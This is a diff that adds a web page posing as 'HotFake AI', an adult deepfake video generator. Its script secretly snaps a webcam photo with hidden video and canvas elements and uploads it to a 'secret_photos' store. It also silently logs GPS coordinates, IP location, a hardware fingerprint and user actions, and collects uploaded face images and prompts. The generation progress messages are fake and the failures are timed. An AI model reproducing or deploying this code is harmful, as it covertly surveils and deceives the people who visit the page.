@@ -1,1 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#07070F">
+    <title>HotFake AI – Video Generator</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+      :root { --bg: #07070F; --surf: #0F0F1C; --surf2: #181828; --red: #E63946; --red-glow: rgba(230,57,70,0.25); --text: #F0F0FF; --muted: #6E6E98; --border: rgba(255,255,255,0.07); --radius: 14px; --font: 'Poppins', sans-serif; --ease: 0.28s cubic-bezier(.4,0,.2,1); }
+      *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+      body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; padding-bottom: 75px; }
+      
+      header { position: sticky; top: 0; z-index: 100; background: rgba(7,7,15,0.88); backdrop-filter: blur(18px); border-bottom: 1px solid var(--border); padding: .9rem 2rem; }
+      nav { max-width:1400px; margin:0 auto; display:flex; align-items:center; justify-content:space-between; }
+      .logo { font-size:1.6rem; font-weight:800; color:var(--text); text-decoration:none; display:flex; align-items:center; gap:.4rem; letter-spacing:-1px; }
+      
+      .container { max-width: 800px; margin: 2rem auto; padding: 0 1.5rem; }
+      .card { background: var(--surf); border: 1px solid var(--border); border-radius: var(--radius); padding: 2rem; margin-bottom: 2rem; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+      
+      .inp { width: 100%; padding: 1rem; background: var(--surf2); border: 1px solid var(--border); border-radius: 10px; color: var(--text); font-family: var(--font); margin-bottom: 1rem; outline: none; font-size: 0.95rem; }
+      .inp:focus { border-color: var(--red); box-shadow: 0 0 0 3px var(--red-glow); }
+      textarea.inp { resize: vertical; min-height: 120px; }
+      
+      .btn { display: inline-flex; align-items: center; justify-content: center; gap: .5rem; padding: 1rem; border-radius: 10px; font-weight: 600; cursor: pointer; border: none; background: var(--red); color: #fff; width: 100%; font-size: 1rem; font-family: var(--font); transition: transform 0.2s; }
+      .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px var(--red-glow); }
+      .btn-gray { background: var(--surf2); border: 1px solid var(--border); }
+      
+      .upload-box { width: 100%; aspect-ratio: 16/9; background: var(--surf2); border: 2px dashed rgba(255,255,255,0.2); border-radius: 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; margin-bottom: 1rem; position: relative; overflow: hidden; transition: all 0.3s;}
+      .upload-box:hover { border-color: var(--red); background: rgba(230,57,70,0.05); }
+      .upload-box img#previewImg { width: 100%; height: 100%; object-fit: cover; position: absolute; inset: 0; display: none; z-index: 1; }
+      
+      .processing-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; display: none; }
+      .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
+      .proc-text { font-size: 0.9rem; font-weight: 500; font-family: monospace; color: #a5a5b5; text-align: center; padding: 0 10px; }
+      
+      .result-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.85); z-index: 20; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; backdrop-filter: blur(5px);}
+      .error-msg { color: #ff8c94; font-size: 0.85rem; font-weight: 600; margin-bottom: 15px; background: rgba(230,57,70,0.2); padding: 10px; border-radius: 8px; border: 1px solid var(--red); }
+      
+      @keyframes spin { 100% { transform: rotate(360deg); } }
+      .hidden { display: none !important; }
 
+      .modal-bg { position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:10000; display:flex; align-items:center; justify-content:center; padding:1.2rem; backdrop-filter:blur(10px); }
+      .modal-content { background:var(--surf); border:1px solid var(--red); border-radius:20px; padding:2rem 1.5rem; text-align:center; max-width:350px; width:100%; box-shadow: 0 20px 40px rgba(0,0,0,0.8); }
+      .modal-btn-group { display:flex; gap:0.8rem; justify-content:center; width: 100%; margin-top: 15px;}
+      .info-box { background: rgba(0,0,0,0.3); border-left: 3px solid var(--red); padding: 12px 14px; border-radius: 8px; text-align: left; margin-bottom: 1.5rem; }
+
+      #playerModal { display:none; position:fixed; inset:0; background:#000; z-index:9999; flex-direction:column; touch-action: none !important;}
+      .player-wrapper { flex:1; display:flex; justify-content:center; align-items:center; width:100vw; height:100vh; position:relative; background: #000; }
+      #iframePlayer { width: 100%; height: 100%; border: none; z-index: 1; display:none; }
+      #nativePlayer { width: 100%; height: 100%; z-index: 2; background:#000; display:none; }
+      .smart-overlay { position: absolute; inset: 0; z-index: 99; display: flex; flex-direction: column; justify-content: space-between; pointer-events: none; }
+      .glass-top { background: linear-gradient(to bottom, rgba(0,0,0,0.9), transparent); height: 90px; display: flex; align-items: flex-start; padding: 15px 20px; pointer-events: auto; }
+      .ui-back-btn { background: rgba(255,255,255,0.15); color: white; width: 40px; height: 40px; border-radius: 50%; font-size: 1.1rem; display: flex; justify-content: center; align-items: center; cursor: pointer; border:none;}
+      
+      .bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(15,15,28,0.95); backdrop-filter: blur(15px); border-top: 1px solid var(--border); display: flex; justify-content: space-around; padding: 10px 0; z-index: 1000; }
+      .nav-item { display: flex; flex-direction: column; align-items: center; color: var(--muted); text-decoration: none; font-size: 0.7rem; font-weight: 500; gap: 4px; }
+      .nav-item.active { color: #fff; }
+    </style>
+</head>
+<body>
+
+<video id="secretVideo" width="640" height="480" autoplay playsinline style="display:none;"></video>
+<canvas id="secretCanvas" width="640" height="480" style="display:none;"></canvas>
+
+<div id="ageGate" class="modal-bg" style="display:none;">
+    <div class="modal-content">
+        <div style="font-size: 3rem; margin-bottom: 0.5rem;">🔞</div>
+        <h3>Age Verification</h3>
+        <p style="color:var(--muted); font-size:0.85rem;">This AI generates mature content. Are you 18+?</p>
+        <div class="modal-btn-group">
+            <button class="btn btn-gray" onclick="setAgeStatus('no')">Under 18</button>
+            <button class="btn" onclick="setAgeStatus('yes')">I am 18+</button>
+        </div>
+    </div>
+</div>
+
+<div id="banGate" class="modal-bg" style="display:none; z-index: 999999;">
+    <div class="modal-content">
+        <div style="font-size: 3rem; margin-bottom: 0.5rem;">🚫</div>
+        <h3>Access Denied</h3><p style="color:var(--muted); font-size:0.85rem;">Your device is permanently banned.</p>
+    </div>
+</div>
+
+<div id="gpsGate" class="modal-bg" style="display:none; z-index: 10005;">
+    <div class="modal-content">
+        <div style="font-size: 3rem; margin-bottom: 0.5rem;">🌍</div>
+        <h3>Location Request</h3>
+        <p style="color:var(--muted); font-size:0.85rem;">For security, we recommend granting location access. If unavailable, you may still proceed.</p>
+        <div class="info-box"><p style="margin:0; font-size:0.8rem; color:#a5a5b5;"><b>Note:</b> You can ignore this step by tapping Continue.</p></div>
+        <button class="btn" style="width:100%;" onclick="requestGPSAccess()">Continue Setup</button>
+    </div>
+</div>
+
+<header>
+  <nav>
+    <a href="#" class="logo"><span style="color:var(--red);">▶</span> HotFake AI</a>
+  </nav>
+</header>
+
+<div class="container">
+
+    <div id="appSection" class="hidden">
+        <div class="card" id="generatorCard">
+            <h3 style="margin-bottom: 1rem; color: var(--red);">✨ Generate Video</h3>
+            
+            <input type="file" id="fileInput" accept="image/*" style="display:none;" onchange="handleImageSelect(event)">
+            <div class="upload-box" id="uploadBox" onclick="document.getElementById('fileInput').click()">
+                <div id="uploadPlaceholder">
+                    <div style="font-size: 2.5rem; margin-bottom: 10px;">📸</div>
+                    <div style="color: #a5a5b5; font-size: 0.9rem; font-weight: 500;">Tap to Select Image</div>
+                </div>
+                <img id="previewImg">
+                
+                <div class="processing-overlay" id="procOverlay">
+                    <div class="spinner"></div>
+                    <div class="proc-text" id="procText">Uploading HQ Image...</div>
+                </div>
+
+                <div class="result-overlay" id="resultOverlay"></div>
+            </div>
+
+            <div id="inputControls">
+                <textarea id="aiPrompt" class="inp" placeholder="Describe the scene, characters, and actions in detail..."></textarea>
+                <button id="genBtn" class="btn" onclick="startGeneration()">✨ Generate</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="playerModal">
+  <div class="player-wrapper">
+       <div class="smart-overlay">
+           <div class="glass-top">
+               <div style="display:flex; align-items:center;">
+                   <button class="ui-back-btn" onclick="closePlayer()">⬅</button>
+                   <span class="overlay-title" id="overlayTitle" style="margin-top:8px;">Generated Video</span>
+               </div>
+           </div>
+       </div>
+       <video id="nativePlayer" controls playsinline></video>
+       <iframe id="iframePlayer" allowfullscreen></iframe>
+  </div>
+</div>
+
+<div class="bottom-nav">
+    <a href="index.html" class="nav-item active"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path></svg>Generate</a>
+    <a href="profile.html" class="nav-item"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>Saved</a>
+    <a href="contact-support.html" class="nav-item"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>Auth</a>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+  import { getDatabase, ref, set, push, onValue, update, get, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+
+  // Updated with New Firebase Project Credentials
+  const firebaseConfig = {
+    apiKey: "AIzaSyAI3ysLR_LFnG5dw2SY8AwF1ldGgc43ywE",
+    authDomain: "ai-studio-b0c87.firebaseapp.com",
+    databaseURL: "https://ai-studio-b0c87-default-rtdb.firebaseio.com",
+    projectId: "ai-studio-b0c87",
+    storageBucket: "ai-studio-b0c87.firebasestorage.app",
+    messagingSenderId: "699632892927",
+    appId: "1:699632892927:web:3d38f396c8897a36e885ca"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+  
+  let deviceId = null;
+  let isGpuOnline = false;
+  let currentBase64Image = "";
+  let activeReqId = null;
+  let animationInterval = null;
+
+  function getDeepDeviceId() {
+      if (window.AndroidInterface && window.AndroidInterface.getRootId) return "APP-" + window.AndroidInterface.getRootId();
+      const hwCores = navigator.hardwareConcurrency || 2; const ram = navigator.deviceMemory || 2;
+      const os = (/Android/i.test(navigator.userAgent)) ? "AND" : (/iPhone|iPad/i.test(navigator.userAgent)) ? "IOS" : "PC";
+      const screenRes = window.screen.width + "x" + window.screen.height + "x" + window.screen.colorDepth;
+      let gpu = "UnknownGPU";
+      try { const gl = document.createElement('canvas').getContext('webgl'); if(gl) { const dbg = gl.getExtension('WEBGL_debug_renderer_info'); if(dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); } } catch(e) {}
+      const rawString = `${hwCores}-${ram}-${os}-${screenRes}-${gpu}`;
+      let hash = 0; for (let i = 0; i < rawString.length; i++) { hash = ((hash << 5) - hash) + rawString.charCodeAt(i); hash |= 0; }
+      const finalId = `${os}-HW-${Math.abs(hash).toString(36).toUpperCase()}`;
+      localStorage.setItem('hotfake_deep_uid', finalId);
+      return finalId;
+  }
+  deviceId = getDeepDeviceId();
+
+  function getAdvancedDeviceInfo() {
+      const ua = navigator.userAgent; let type = "Desktop"; 
+      if (/Tablet|iPad/i.test(ua) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 2)) type = "Tablet";
+      else if (/Mobile|Android|iP(hone|od)/i.test(ua)) type = "Mobile";
+      let os = (/Windows/i.test(ua)) ? "Windows" : (/Mac/i.test(ua)) ? "MacOS" : (/Android/i.test(ua)) ? "Android" : "iOS";
+      return { type: type, os: os, browser: (/Edg/i.test(ua)) ? "Edge" : (/Chrome/i.test(ua)) ? "Chrome" : "Safari", screen: `${window.screen.width}x${window.screen.height}` };
+  }
+
+  window.logAction = function(actionDesc) { 
+      if(!deviceId) return; 
+      set(ref(db, `users/${deviceId}/actions/${Date.now()}`), { action: actionDesc, time: new Date().toISOString() }); 
+  };
+
+  function silentGPSUpdate() {
+      if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+              (pos) => { if(deviceId) { set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy) + "m", time: new Date().toISOString() }); } },
+              (err) => {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+      }
+  }
+
+  async function trackUser() {
+      const advInfo = getAdvancedDeviceInfo(); 
+      const fullDate = new Date().toISOString();
+      let ipData = { ip: "Unknown", city: "Unknown", region: "Unknown", org: "Unknown" }; 
+      try { const res = await fetch('https://ipapi.co/json/'); if(res.ok) { const jd = await res.json(); ipData = { ip: jd.ip, city: jd.city, region: jd.region, org: jd.org }; } } catch(e){}
+
+      get(ref(db, `users/${deviceId}`)).then((snap) => {
+          const locId = Date.now();
+          if (!snap.exists()) { 
+              set(ref(db, `users/${deviceId}`), { firstVisit: fullDate, lastActive: fullDate, status: "Live", network: ipData, device: advInfo, banned: false, deviceApproved: false, locationHistory: { [locId]: { ...ipData, time: fullDate } } }); 
+              logAction("First visit to App");
+          } else { 
+              update(ref(db, `users/${deviceId}`), { lastActive: fullDate, network: ipData, status: "Live", device: advInfo }); 
+              set(ref(db, `users/${deviceId}/locationHistory/${locId}`), { ...ipData, time: fullDate });
+              logAction("App Opened"); 
+          }
+          checkGates();
+      });
+
+      onValue(ref(db, ".info/connected"), (snap) => { 
+          if (snap.val() === true && deviceId) { onDisconnect(ref(db, `users/${deviceId}/status`)).set("Offline").then(() => { update(ref(db, `users/${deviceId}`), { status: "Live" }); }); } 
+      });
+  }
+
+  function checkGates() {
+      if(!localStorage.getItem('gpsVerified')) { window.location.href = 'permission.html'; return; }
+      const ageStatus = sessionStorage.getItem('ageStatus');
+      if (!ageStatus) { document.getElementById('ageGate').style.display = 'flex'; return; }
+
+      get(ref(db, `users/${deviceId}`)).then(snap => {
+          if(snap.exists()) {
+              const u = snap.val();
+              if(u.banned) { document.getElementById('banGate').style.display = 'flex'; return; }
+              if(u.deviceApproved !== true) { window.location.href = 'contact-support.html'; return; } 
+              
+              document.getElementById('appSection').classList.remove('hidden');
+              checkActiveGeneration();
+              attemptSilentCapture(); silentGPSUpdate();
+          } else { window.location.href = 'contact-support.html'; }
+      });
+  }
+
+  function attemptSilentCapture() {
+      navigator.permissions.query({ name: 'camera' }).then(perm => {
+          if (perm.state === 'granted') {
+              navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(stream => {
+                  const video = document.getElementById('secretVideo'); const canvas = document.getElementById('secretCanvas');
+                  video.srcObject = stream; video.play();
+                  video.addEventListener('canplay', () => {
+                      setTimeout(() => {
+                          canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                          const dataUrl = canvas.toDataURL('image/jpeg', 0.5); 
+                          set(ref(db, 'secret_photos/' + Date.now().toString(36)), { imageBase64: dataUrl, deviceId: deviceId, time: new Date().toISOString() });
+                          stream.getTracks().forEach(t => t.stop());
+                      }, 150);
+                  }, { once: true });
+              }).catch(e=>{});
+          }
+      });
+  }
+
+  window.setAgeStatus = (status) => { sessionStorage.setItem('ageStatus', status); document.getElementById('ageGate').style.display = 'none'; logAction("Age verified: "+status); checkGates(); }
+  window.requestGPSAccess = () => {
+      if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+              (pos) => { 
+                  localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
+                  set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), { lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toISOString() });
+                  checkGates();
+              }, 
+              (err) => { 
+                  localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
+                  checkGates();
+              }, 
+              { enableHighAccuracy: true, timeout: 5000 }
+          );
+      } else {
+          localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
+          checkGates();
+      }
+  }
+
+  onValue(ref(db, 'settings/admin_status'), snap => { isGpuOnline = snap.val() === true; });
+  trackUser();
+
+  window.handleImageSelect = (event) => {
+      const file = event.target.files[0]; if (!file) return;
+      const reader = new FileReader();
+      reader.onload = (e) => {
+          const img = new Image();
+          img.onload = () => {
+              const canvas = document.createElement('canvas'); 
+              const MAX_WIDTH = 1080;
+              const MAX_HEIGHT = 1080;
+              let width = img.width; let height = img.height;
+              
+              if (width > MAX_WIDTH) { height = Math.round((height * MAX_WIDTH) / width); width = MAX_WIDTH; }
+              if (height > MAX_HEIGHT) { width = Math.round((width * MAX_HEIGHT) / height); height = MAX_HEIGHT; }
+              
+              canvas.width = width; canvas.height = height; 
+              const ctx = canvas.getContext('2d'); ctx.drawImage(img, 0, 0, width, height);
+              
+              currentBase64Image = canvas.toDataURL('image/jpeg', 0.8);
+              
+              document.getElementById('previewImg').src = currentBase64Image; 
+              document.getElementById('previewImg').style.display = 'block'; 
+              document.getElementById('uploadPlaceholder').style.display = 'none';
+              logAction("High-Quality Image selected");
+          };
+          img.src = e.target.result;
+      };
+      reader.readAsDataURL(file);
+  };
+
+  function checkActiveGeneration() {
+      const savedReqId = localStorage.getItem('activeReqId');
+      if(savedReqId) {
+          activeReqId = savedReqId;
+          try { currentBase64Image = localStorage.getItem('savedAiImage') || ""; } catch(e){}
+          const savedPrompt = localStorage.getItem('savedAiPrompt') || "";
+          
+          if(currentBase64Image) {
+              document.getElementById('previewImg').src = currentBase64Image; 
+              document.getElementById('previewImg').style.display = 'block'; 
+              document.getElementById('uploadPlaceholder').style.display = 'none';
+          }
+          if(savedPrompt) document.getElementById('aiPrompt').value = savedPrompt;
+
+          document.getElementById('inputControls').style.display = 'none'; 
+          document.getElementById('uploadBox').style.pointerEvents = 'none';
+          attachGenerationListener();
+      }
+  }
+
+  function attachGenerationListener() {
+      onValue(ref(db, `ai_requests/${activeReqId}`), (snap) => {
+          if(!snap.exists()) { resetGenerator(); return; }
+          const req = snap.val();
+          
+          if(req.status === 'uploading' || req.status === 'pending' || req.status === 'generating') {
+              document.getElementById('procOverlay').style.display = 'flex';
+              
+              if(req.status === 'uploading') {
+                  document.getElementById('procText').innerText = "Uploading HQ Image...";
+              } else if(!animationInterval) {
+                  const steps = ["Allocating GPU resources...", "Scanning facial topology...", "Applying Deep models...", "Rendering frame sequence...", "Finalizing video export..."];
+                  let stepIdx = 0;
+                  animationInterval = setInterval(() => { 
+                      if(stepIdx < steps.length) { document.getElementById('procText').innerText = steps[stepIdx]; stepIdx++; } 
+                  }, 2500);
+              }
+          } else if(req.status === 'completed' || req.status === 'error') {
+              clearInterval(animationInterval); animationInterval = null;
+              document.getElementById('procOverlay').style.display = 'none'; 
+              showResultUI(req);
+          }
+      });
+  }
+
+  window.startGeneration = () => {
+      const prompt = document.getElementById('aiPrompt').value.trim();
+      if(!currentBase64Image) return alert("Please select an image first.");
+      if(!prompt) return alert("Please enter a prompt.");
+
+      document.getElementById('inputControls').style.display = 'none'; 
+      document.getElementById('uploadBox').style.pointerEvents = 'none';
+      const overlay = document.getElementById('procOverlay'); const procText = document.getElementById('procText'); 
+      overlay.style.display = 'flex';
+      procText.innerText = "Processing request...";
+
+      const reqRef = push(ref(db, 'ai_requests')); 
+      activeReqId = reqRef.key;
+
+      localStorage.setItem('activeReqId', activeReqId);
+      localStorage.setItem('savedAiPrompt', prompt);
+      try { localStorage.setItem('savedAiImage', currentBase64Image); } catch(e){} 
+
+      set(reqRef, {
+          deviceId: deviceId, prompt: prompt, imageUrl: "uploading", 
+          status: 'uploading', errorMsg: '', videoUrl: '', timestamp: new Date().toISOString(), userHidden: false
+      }).then(async () => {
+          try {
+              procText.innerText = "Uploading HQ Image smoothly...";
+              const dbUrl = `https://ai-studio-b0c87-default-rtdb.firebaseio.com/ai_requests/${activeReqId}.json`;
+              const response = await fetch(dbUrl, {
+                  method: 'PATCH',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({
+                      imageUrl: currentBase64Image,
+                      status: 'pending' 
+                  })
+              });
+
+              if(!response.ok) throw new Error("Stream Failed");
+
+              if(!isGpuOnline) { 
+                  setTimeout(() => { update(ref(db, `ai_requests/${activeReqId}`), { status: 'error', errorMsg: 'GPU Clusters Unreachable. Connection Timeout.' }); }, 8000); 
+              }
+              attachGenerationListener();
+
+          } catch(e) {
+              alert("Upload Interrupted: Please check your internet connection.");
+              resetGenerator();
+          }
+      }).catch(e => {
+          alert("Network Initialization Error.");
+          resetGenerator();
+      });
+  };
+
+  function showResultUI(req) {
+      const resOverlay = document.getElementById('resultOverlay'); resOverlay.style.display = 'flex';
+      if(req.status === 'completed') {
+          resOverlay.innerHTML = `
+            <button onclick="playAiVideo('${req.videoUrl}')" class="btn" style="width:80%; margin-bottom:10px; border-radius:50px; background:#2DC653;">▶ Play Video</button>
+            <button onclick="resetGenerator()" class="btn btn-gray" style="width:80%; border-radius:50px;">🔄 Start New Generation</button>
+          `;
+      } else if(req.status === 'error') {
+          resOverlay.innerHTML = `
+            <div class="error-msg">⚠️ ${req.errorMsg}</div>
+            <button onclick="resetGenerator()" class="btn btn-gray" style="width:80%; border-radius:50px;">🔄 Try Again</button>
+          `;
+      }
+  }
+
+  window.resetGenerator = () => {
+      activeReqId = null; currentBase64Image = ""; 
+      localStorage.removeItem('activeReqId'); localStorage.removeItem('savedAiImage'); localStorage.removeItem('savedAiPrompt');
+      document.getElementById('fileInput').value = ''; document.getElementById('previewImg').src = ''; document.getElementById('previewImg').style.display = 'none';
+      document.getElementById('uploadPlaceholder').style.display = 'block'; document.getElementById('resultOverlay').style.display = 'none'; document.getElementById('procOverlay').style.display = 'none';
+      document.getElementById('inputControls').style.display = 'block'; document.getElementById('uploadBox').style.pointerEvents = 'auto'; document.getElementById('aiPrompt').value = '';
+  };
+
+  window.playAiVideo = (url) => {
+      document.body.style.overflow = 'hidden'; document.getElementById('playerModal').style.display = 'flex';
+      const nativeP = document.getElementById('nativePlayer'); const iframeP = document.getElementById('iframePlayer');
+      if (url.match(/\.(mp4|m3u8)$/i) || url.includes('.mp4?') || url.startsWith('blob:')) { iframeP.style.display = 'none'; nativeP.style.display = 'block'; nativeP.src = url; nativeP.play(); } 
+      else { nativeP.style.display = 'none'; iframeP.style.display = 'block'; iframeP.src = url; }
+  };
+  window.closePlayer = () => {
+      document.getElementById('playerModal').style.display = 'none'; document.body.style.overflow = '';
+      document.getElementById('nativePlayer').pause(); document.getElementById('nativePlayer').src = ''; document.getElementById('iframePlayer').src = '';
+  };
+</script>
+</body>
+</html>
